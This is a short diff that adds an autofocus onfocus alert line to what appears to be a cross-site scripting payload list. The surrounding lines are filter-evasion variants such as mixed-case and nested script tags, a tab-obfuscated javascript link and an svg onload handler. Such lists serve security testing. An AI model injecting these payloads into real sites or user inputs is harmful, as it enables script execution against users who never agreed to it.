@@ -38,6 +38,7 @@ location.hash=null
 <sCRipT>alert(1)</sCRiPt>
 <script>%0aalert(1)</script>
 <scr<script>ipt<alert(1);</scr<script>ipt>
+<input onfocus="alert('xss');" autofocus>
 <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pi&Tab;pt&Tab;alert&lpar;1&rpar;">
 <svg•onload=alert(1)>
 <script>alert?.(document?.domain)</script>
